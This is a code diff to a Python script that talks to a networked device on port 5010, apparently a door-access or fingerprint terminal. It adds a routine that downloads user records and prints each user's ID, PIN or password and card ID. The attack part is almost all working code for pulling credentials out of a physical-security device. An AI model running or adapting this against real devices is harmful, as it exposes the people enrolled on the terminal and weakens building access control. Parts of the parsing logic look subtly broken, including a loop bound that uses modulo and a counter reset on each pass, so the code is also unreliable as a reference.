@@ -155,11 +155,13 @@ def sendPayload(ip, port, payload):
     ack = response[5]  # 1 byte
     returnValue = response[6]  # 1 byte
     size = response[7:9]  # 2 bytes
+    size = struct.unpack(">H", size)[0]
+
 
     print("[*] Response: %s" % binascii.hexlify(response))
 
     # sanity check for data integrity
-    if (len(response) != (9 + size + 2)):  # 9 bytes from previous values plus size of the packet plus 2 bytes for CRC16
+    if (len(response) != (9 + int(size) + 2)):  # 9 bytes from previous values plus size of the packet plus 2 bytes for CRC16
         raise Exception("Packet Size differs from actual size")
 
     data = b''
@@ -235,8 +237,55 @@ def getNetwork(ip, port=5010, CH=b"\x00\x00\x00\x00"):
 
 def getUserRecords(ip, port=5010, CH=b"\x00\x00\x00\x00"):
     payload = makePayload(CMD_GET_RECORDS, CH=CH)
-    response = sendPayload(ip, port, payload)
-    return response
+    (preamble, deviceCode, ack, returnValue, size, data, crc) = sendPayload(ip, port, payload)
+
+    user_amount = data[1:3]
+    fp_amount = data[4:6]
+    password_amount = data[7:9]
+    card_amount = data[10:12]
+    all_record_amount = data[13:15]
+    new_record_amount = data[16:18]
+
+    user_amount = struct.unpack(">H", user_amount)[0]
+    print("[*] user_amount: %d" % int(user_amount))
+
+
+    payload_data = b'\x01\x0c'
+    for i in range(0, (int(user_amount)%12)): # data length: 12*30 = 360Byte
+        payload = makePayload(CMD_DOWNLOAD_USERS, data=payload_data, CH=CH)
+        (preamble, deviceCode, ack, returnValue, size, data, crc) = sendPayload(ip, port, payload)
+        payload_data = b'\x00\x0c'
+
+        print("[*] data: %s" % data)
+
+        counter = 0
+        base = 1+counter*12
+        # print("[*] User??: %s" % data[5])
+        user_id = data[base+1:(base+5)]
+        passwd_len = data[base+5] >> 4
+        passwd = []
+        passwd.append(data[base+5]&0x0F)
+        passwd[1:passwd_len] = data[(base+6):(base+6+int(passwd_len))]
+
+        passwd_decoded = ''.join(chr(i) for i in passwd)
+
+        #passwd = data[(base+6):(base+6+int(passwd_len))]
+        #asswd = bytearray.fromhex(passwd).decode('utf-8')
+
+        user_id = struct.unpack(">I", user_id)[0]
+        print("[*] User: %s" % user_id)
+        print("[*] Password_len: %s" % passwd_len)
+        print("[*] Password: %s" % passwd)
+        # print("[*] Password: %s" % bytes.fromhex(binascii.hexlify(passwd)))
+        # print("[*] Password: %s" % binascii.unhexlify(binascii.hexlify(passwd)))
+
+        pwd = data[(base+6):(base+8)]
+        card_id = data[(base+9):(base+12)]
+        counter = counter+1
+
+        print("[*] new_record_amount: %s" % size)
+
+    return (preamble, deviceCode, ack, returnValue, size, data, crc)
 
 
 def getFactoryInfoCode(ip, port=5010, CH=b"\x00\x00\x00\x00"):
